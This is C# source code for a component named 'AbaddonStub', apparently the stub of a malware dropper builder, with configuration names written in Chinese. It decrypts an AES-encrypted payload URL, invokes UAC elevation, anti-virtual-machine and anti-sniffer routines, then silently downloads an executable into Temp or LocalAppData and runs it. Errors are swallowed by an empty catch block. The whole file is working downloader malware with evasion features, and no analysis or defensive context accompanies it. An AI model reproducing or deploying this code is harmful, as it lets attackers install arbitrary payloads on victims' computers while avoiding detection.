using System;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Text;

namespace AbaddonStub.Start
{
    internal class 開始
    {
      
       public static WebClient client = new WebClient();
       public static async Task MainAsync()
       {
           try
           {
                if (Options.加密.網址 == "True") { Options.有效載荷.火衛二 = Decrypthook.RunDecryption(Options.有效載荷.火衛二); }
                if (Options.用戶訪問控制.行政 == "True") { OptionCode.管理員代碼.Uac(); }
                if (Options.虛擬機.反對 == "True") { OptionCode.虛擬機代碼.虛擬的(); }
                if (Options.網絡嗅探.嗅 == "True") { OptionCode.嗅探器代碼.嗅探器(true); }
             

                if (Options.小路.路徑路徑 == "Temp")
                {
                    if (Options.丟棄名稱.姓名.EndsWith(".exe"))
                    {
                        client.DownloadFile(Options.有效載荷.火衛二, Path.GetTempPath() + Options.丟棄名稱.姓名);
                        Process.Start(Path.GetTempPath() + Options.丟棄名稱.姓名);
                    }
                    else
                    {
                        client.DownloadFile(Options.有效載荷.火衛二, Path.GetTempPath() + Options.丟棄名稱.姓名 + ".exe");
                        Process.Start(Path.GetTempPath() + Options.丟棄名稱.姓名 + ".exe");
                    }
                    

                }
                if (Options.小路.路徑路徑 == "Local")
                {
                    if (Options.丟棄名稱.姓名.EndsWith(".exe"))
                    {
                        client.DownloadFile(Options.有效載荷.火衛二, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + $"\\{Options.丟棄名稱.姓名}");
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + $"\\{Options.丟棄名稱.姓名}");
                    }
                    else
                    {
                        client.DownloadFile(Options.有效載荷.火衛二, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + $"\\{Options.丟棄名稱.姓名}.exe");
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + $"\\{Options.丟棄名稱.姓名}.exe");
                    }
                   
                }
           }
           catch { }

          
       }

       
    }

    class Decrypthook
    {
        public static string iv = "rtuoglkifgerdnuh";
        public static string key = Options.鑰匙.鑰匙鑰匙;

        public static AesCryptoServiceProvider GetAes()
        {
            var aes = new AesCryptoServiceProvider();
            aes.BlockSize = 128;
            aes.KeySize = 256;
            aes.Key = Encoding.ASCII.GetBytes(key);
            aes.IV = Encoding.ASCII.GetBytes(iv);
            aes.Padding = PaddingMode.PKCS7;
            aes.Mode = CipherMode.CBC;

            return aes;
        }




        public static string RunDecryption(string text)
        {
            byte[] dtexts = Convert.FromBase64String(text);
            var encdec = GetAes();

            ICryptoTransform icrypt = encdec.CreateDecryptor(encdec.Key, encdec.IV);
            byte[] dec = icrypt.TransformFinalBlock(dtexts, 0, dtexts.Length);
            icrypt.Dispose();
            return Encoding.ASCII.GetString(dec);

        }


    }



}
